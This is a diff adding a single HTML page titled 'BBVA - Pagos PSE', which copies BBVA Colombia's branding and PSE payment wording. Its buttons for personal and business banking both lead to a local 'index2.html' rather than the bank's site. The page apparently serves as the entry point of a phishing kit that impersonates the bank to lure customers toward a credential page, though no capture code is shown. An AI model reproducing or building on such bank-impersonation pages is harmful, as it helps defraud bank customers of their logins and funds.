@@ -1,0 +1,97 @@
+<!DOCTYPE html><html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA - Pagos PSE</title>
+    <link rel="icon" href="img/BBVA-Logo.png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            background-color: #ffffff;
+        }
+        .header {
+            background-color: #002D62;
+            color: white;
+            padding: 15px;
+            font-size: 18px;
+        }
+        .container {
+            padding: 20px;
+        }
+        .button {
+            display: block;
+            width: 80%;
+            max-width: 400px;
+            margin: 10px auto;
+            padding: 15px;
+            font-size: 18px;
+            border: none;
+            cursor: pointer;
+            color: white;
+        }
+        .button.personas {
+            background-color: #002D62;
+        }
+        .button.empresas {
+            background-color: #0076c6;
+        }
+        .info {
+            background-color: #f8f4e5;
+            padding: 20px;
+            text-align: left;
+            max-width: 600px;
+            margin: auto;
+        }
+        .footer {
+            background-color: #002D62;
+            color: white;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        .footer a {
+            color: #ffffff;
+            text-decoration: none;
+            display: block;
+            margin: 5px 0;
+        }
+        .social-icons {
+            margin-top: 10px;
+        }
+        .social-icons img {
+            width: 30px;
+            margin: 0 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <strong>BBVA</strong> - Pagos a través de PSE
+    </div>
+    <div class="container">
+        <h2>¿En cuál canal estás registrado como cliente?</h2>
+        <button onclick="window.location.href='./index2.html'"  class="button personas">BBVA net (Personas)</button>
+        <button onclick="window.location.href='./index2.html'" class="button empresas">BBVA net cash (Empresas)</button>
+    </div>
+    <div class="info">
+        <h3>¿Cuentas con clave para realizar transacciones online?</h3>
+        <p>Para realizar pagos con tus productos en PSE, debes estar registrado en BBVA Net (Personas) o BBVA Net Cash (Empresas), tener activo tu Token Digital en la App BBVA o tener tarjeta de coordenadas y seguir las instrucciones de pago. Si aún no estás registrado, ingresa por la opción Acceso y regístrate en <a href="https://www.bbva.com.co">BBVA.com.co</a></p>
+    </div>
+    <div class="footer">
+        <h2>BBVA</h2>
+        <a href="#">Seguridad</a>
+        <a href="#">Aviso legal</a>
+        <a href="#">Políticas</a>
+        <!-- <div class="social-icons">
+            <img src="facebook-icon.png" alt="Facebook">
+            <img src="twitter-icon.png" alt="Twitter">
+            <img src="linkedin-icon.png" alt="LinkedIn">
+            <img src="youtube-icon.png" alt="YouTube">
+        </div> -->
+        <p>&copy; 2020 BBVA Banco Bilbao Vizcaya Argentaria Colombia S.A</p>
+    </div>
+    
+</body>
+</html>
